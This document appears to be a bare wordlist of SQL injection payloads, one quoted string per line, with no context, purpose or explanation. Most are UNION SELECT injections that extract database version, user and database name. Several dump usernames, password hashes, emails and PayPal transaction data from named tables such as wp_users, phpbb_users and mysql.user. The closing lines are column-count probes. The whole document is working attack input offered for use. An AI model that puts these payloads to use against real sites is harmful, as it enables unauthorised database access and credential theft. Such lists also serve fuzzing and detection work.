"-1 union select 1,concat_ws(0x3a,first_name,password,email,privilege),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from tbl_reg limit 2,1--"
"-1 union select 1,concat_ws(0x3a,g_userName,g_hashedPassword,g_email),3,4,5,6,7,8,9,0,11,12,13,14,15,16,17 from usr_web4_2.g1_User limit 1,1/*"
"-1 union select 1,concat_ws(0x3a,_id,login,pass,email),3,4,5,6,7,8,9,10,11,12 from damagame_damagame.players where login=0x61646d696e--"
"-1 UNION SELECT 1,concat_ws(0x3A,id,mc_gross,payment_gross,shipping,tax,mc_fee,payment_fee,mc_currency,txn_type,payment_date,payment_status,verify_sign,txn_id,payment_type,receiver_id,item_name,item_number,receipt_id,custID,rawData),3 FROM bluebitbiz_bluebit_com_au.ecom_paypal/*"
"-1 union select 1,concat_ws(0x3a,id,username,name,password),3,4,5,6,7 from ng.admins"
"-1' union select 1,concat_ws(0x3a,ID,Username,Password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from adminuser --"
"-1 union select 1,concat_ws(0x3a,lgn,pass) from clt_users limit 1,1/*"
"-1 union select 1,concat_ws(0x3a,login,PASSWORD),3,  4,5,6 from ssp_AdminSet--"
"-1 union select 1,concat_ws(0x3a,login,PASSWORD),3,4,5,6 from ssp_AdminSet--"
"-1 union select 1,concat_ws(0x3a,login,password),3,4,5 from system_user/*"
"-1 union select 1,concat_ws(0x3a,login,password),3,concat_ws(char(58),version(),database(),user()),5,6,7,8,9 from bigone_users--"
"-1 union select 1,concat_ws(0x3a,login,password),3 FROM SW_SITE.security LIMIT 5,1/*"
"-1 union select 1,concat_ws(0x3a,login,password,email),3,4,5 from users/*"
"-1 union select 1,concat_ws(0x3a,login,password,email),3,4,5 from users limit 0,1/*"
"-1 union select 1,concat_ws(0x3a,login,psw) from megaload_auth limit 0,1/*"
"-1 union select 1,concat_ws(0x3a,name,pass,mail,icq),3,mail,icq,pass,6,7,8,9 from users/*"
"-1 union select 1,concat_ws(0x3a,name,pass,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13 from user--"
"-1 union select 1,concat_WS(0x3a,name,password),3 from auth--"
"-1' union select 1,concat_ws(0x3a,parol_login,parol_psw),3 from parol_table --"
"-1 union select 1,concat_ws(0x3a,pass,name),3 from users/*"
"-1 union select 1,concat_ws(0x3a,Passw,Admin),3,4,5,6,7 from admin--"
"-1 union select 1,concat_ws(0x3a,password,username),3,4,5 from users--"
"-1 union select 1,concat_ws(0x3a,table_name),3,4,5,6,7 from information_schema.tables"
"-1 union select 1,concat_ws(0x3a,user(),database(),version())/*"
"1 union select 1,concat_ws(0x3a,user(),database(),version()) --"
"1 union select 1,concat_ws(0x3a,user(),database(),version())--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3 --"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3--"
"-1 UNION SELECT 1,concat_ws(0x3a,user(),database(),version()),3,4 --"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5--"
"-1' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5/*"
"-1' union select 1,concat_Ws(0x3a,user(),database(),version()),3,4,5 --"
"-1 union select 1,concat_ws(0x3a  ,user(),database(),version()),3,4,5,6--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6"
"-1' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6--"
"-1 UNION SELECT 1,concat_ws(0x3a ,user(),database(),version()),3,4,5,6"
"-1 UNION SELECT 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6 --"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8/*"
"1' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8/*"
"-1 UNION SELECT 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8 --"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9/*"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9 --"
"-1 union select 1,concat_ws(0x3a  ,user(),database(),version()),3,4,5,6,7,8,9,10,11,12"
"-1' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12#"
"-1 union select 1,concat_Ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13/*"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--"
"-1 UNION SELECT 1,concat_Ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --"
"-1' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 --"
"-1 union select 1,concat_Ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28/*"
"-1' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 /*"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
"1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44"
"1' union select 1,concat_ws(0x3a,user(),database(),version()),3 from mysql.user --"
"-1 union select 1,concat_ws(0x3a,user(),database(),version(),@@version_compile_os)--"
"-1 union select 1,concat_ws(0x3a,user(),database(),version(),@@version_compile_os),3,4 --"
"-1 union select 1,concat_ws(0x3a,User_login,user_pass),3,4,5,6,7,8,9,10 from wp_users --"
"-1 union select 1,concat_ws(0x3a,username,lastlogin,password,email),3,4,5,6,7,8,9,10,11,12,13,14 from admin_login/*"
"-1 union select 1,concat_ws(0x3a,username,passwd),3,4,concat_ws(0x3a,version(),database(),user()),6,7,8,9,10,11,12,13,14,15 from user/*"
"-1 union select 1,concat_ws(0x3a,username,password),3,4,5 from members --"
"-1 union select 1,concat_ws(0x3a,username,password,email),3,4,5,6,7 from itt_reviewer limit 0,1/*"
"1 UNION SELECT 1,concat_ws(0x3a,username,pwd),3,4,5,6,7,8,9,10,11,12,13,14,15 from signup--"
"-1 union select 1,concat_ws(0x3a,USERNAME,USERPASS,EMAIL),3,4 from TB_LOGIN limit 0,1/*"
"-1 UNION SELECT 1,concat_ws(0x3a,username,userpass) FROM poll_user/*"
"1/**/union/**/select/**/1,concat_ws(0x3a,username,user_password),3,4,5 from nuke_phpbb_users/**/limit/**/2,1/*"
"-1 union select 1,concat_ws(0x3a,username,user_password),3,4 from phpbb_users--"
"-1 union select 1,concat_ws(0x3a,user,password),3,4,5,6,7,8,9,10,11,12,13 from phpsp_users--"
"-1 union select 1,concat_ws(0x3a,user,password),3,4,5,6 from admin/*"
"-1 union select 1,concat_ws(0x3a,user,password),3,4,5,6 from mysql.user--"
"-1' union select 1,concat_ws(0x3a,user,password),3,4,5,6 from mysql.user/*"
"-1 union select 1,concat_ws(0x3a,user,password) from mysql.user limit 0,1/*"
"-1 union select 1,concat_ws(0x3a,user,psw),3,4,5,6,7 from prelude--"
"-1 union select 1,concat_ws(0x3a,user,psw),3,4,5,6 from admin--"
"-1 union select 1,concat_ws(0x3a,userUserName,userPassword,userID),3,4,5,6,7,8,9,10 from users--"
"-1' union select 1,concat_ws(0x3a,user(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15 --"
"-1 union select 1,concat_ws(0x3a,user(),version(),database())/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7--"
"-1' UNION SELECT 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7/*"
"1 UNION SELECT 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8--"
"-1' union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9--"
"-1' union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10/*"
"-1 UNION SELECT 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--"
"1 UNION SELECT 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14 LIMIT 1,1/*"
"1 union select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7 limit 1,1/*"
"1 union select 1,concat_ws(0x3a,user(),version(),database()),3 limit 1,1/*"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os) --"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os)--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),3,4,5--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),3,4,5,6--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),3,4,5,6,7 --"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),3,4,5,6,7,8--"
"-1 union select 1,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),3,4,5,6,7,8,9,10,11,12,13--"
"1 union select 1,concat_ws(0x3a,usuario,password),3,4,5,6,7,8,9,10,11 from smartene_SEH.usuarios--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user())"
"-1 union select 1,concat_ws(0x3a,version(),database(),user())/*"
"-1' union select 1,concat_ws(0x3a,version(),database(),user()) --"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3/*"
"-1' union select 1,concat_ws(0x3a,version(),database(),user()),3/*"
"-1 union select 1,concat_Ws(0x3a,version(),database(),user()),3--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4/*"
"-1' union select 1,concat_ws(0x3a,version(),database(),user()),3,4/*"
"1' union select 1,concat_ws(0x3a,version(),database(),user()),3,4 --"
"1 union Select 1,concat_ws(0x3a,version(),database(),user()),3,4 --"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5--"
"-1' union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5 --"
"1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6/*"
"-1' union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6/*"
"-1 union Select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6 --"
"1' union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7#"
"1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8 --"
"1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12/*"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13/*"
"-1 union Select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15 --"
"-1 UNION SELECT 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
"1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--"
"1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--"
"1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33 --"
"1' union select 1,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3/*"
"-1 union select 1,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3,4,5,6,7/*"
"1 union select 1,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3,4,5,6,7--"
"-1 UNION SELECT 1, concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
"-1 union select 1,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
"-1 union select 1,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--"
"-1') union select 1,concat_ws(0x3A,version(),user(),database())--"
"-1 union select 1,concat_ws(0x3a,version(),user(),database()),3/*"
"-1' union select 1,concat_ws(0x3a,version(),user(),database()),3,4/*"
"-1 union select 1,concat_ws(0x3a,version(),user(),database()),3,4,5 --"
"-1 union select 1,concat_ws(0x3a,version(),user(),database()),3,4,5--"
"-1' union select 1,concat_ws(0x3a,version(),user(),database()),3,4,5--"
"-1' union select 1,concat_Ws(0x3a,version(),user(),database()),3,4,5 --"
"-1 Union select 1,concat_ws(0x3a,version(),user() ,database()),3,4,5,6,7,8,9,10,11,12,13,14,15/*"
"-1 union selecT 1,concat_ws(0x3a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16"
"-1 union select 1,concat_ws(0x3a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37/*"
"-1 UNION SELECT 1,concat_ws(0x3a,VERSION(),USER(),DATABASE()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51--"
"1 union select 1,concat_ws(0x3a,VERSION(),USER(),DATABASE()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52/*"
"-1' union select 1,concat_ws(0x3a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13 from mysql.user --"
"-1 union select 1,concat_ws(0x3a,@@version,user(),database(),@@version_compile_os)--"
"-1 union select 1,concat_ws(0x3a,version(),user(),database(),@@version_compile_os)--"
"-1 union select 1,concat_ws(0x3a,version(),user(),database(),@@version_compile_os),3,4--"
"-1 union select 1,concat_ws(0x3a,version(),user(),@@version_compile_os),3,4--"
"1 union select 1,concat_ws(0x3a,vUser,vPassword,vAdmin_email),3,4,5,6,7,8,9,0 from admin--"
"-1 union select 1,concat_ws(0x3b,user(),database(),version()),3,4,5,6,7,8,9,10,11,12/*"
"1 union select 1,concat_ws(0x3,user(),0x3,database(),0x3,version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/*"
"1 union select 1,concat_ws(0x3,version(),user(),database())/*"
"-1 union select 1,concat_ws(0x3,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20/*"
"-1 union select 1,concat_ws(0x7c,database(),0x7c,user(),0x7c,version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64"
"-1 union select 1,concat_ws(0x7c,user(),0x7c,database(),0x7c,version()),3,4,5"
"-1 union select 1,concat_ws(0xb,version(),user(),database()),3,4,5,6,7,8,9,10,11,12/*"
"-1 union select 1,concat_ws(char(32,45,32),username,password),3,4,5 from naira_clients.tbladmins--"
"-1 union select 1,concat_ws(char(32,45,32),Username,Password,testoMail,refMail,mail2,contratto,contratto_eng,contratto_ita,allegato_eng,allegato_ita,brochure_ita,brochure_eng,last_access,last_ip),3,4,5,6 from nav_settings--"
"-1 union select 1,concat_ws(char(32,45,32),version(),user(),database()),3,4,5,6,7,8,9--"
"-1 union select 1,CONCAT_WS(CHAR(32,58,32),user(),database(), version()),3,4,5,6--"
"-1 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--"
"-1 UNION SELECT 1,CONCAT_WS(CHAR(42),VERSION(),USER(),DATABASE()),3,4,5,6,7,8,9,0 --"
"-1 union select 1,concat_ws(char(58,58),user(),database(),version()),3,4,5,6,7,8--"
"-1 union select 1,concat_ws(char(58,58),user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13/*"
"-1 union SELECT 1,concat_ws(char(58,58),user_id,user_email,password,password2) FROM fwd_users/*"
"-1 union select 1,concat_ws(char(58,58),version(),database(),user()),3,4/*"
"-4993))) UNION ALL SELECT 1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285,1285--"
"-6380))) UNION ALL SELECT 6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678,6678--"
"-9133))) UNION ALL SELECT 3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362,3362--"
"-8946))) UNION ALL SELECT 2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156,2156--"
"-1543))) UNION ALL SELECT 4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240,4240--"
"-8075))) UNION ALL SELECT 8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587,8587--"
"-1374))) UNION ALL SELECT 5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657,5657--"
"-6653))) UNION ALL SELECT 5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586,5586--"
"-9084))) UNION ALL SELECT 5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964,5964--"
"-6709 UNION ALL SELECT 8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612,8612--"
"-8350 UNION ALL SELECT 4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657,4657--"
"-2693 UNION ALL SELECT 3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990,3990--"
"-4664 UNION ALL SELECT 8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411,8411--"
"-3149 UNION ALL SELECT 1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264,1264--"
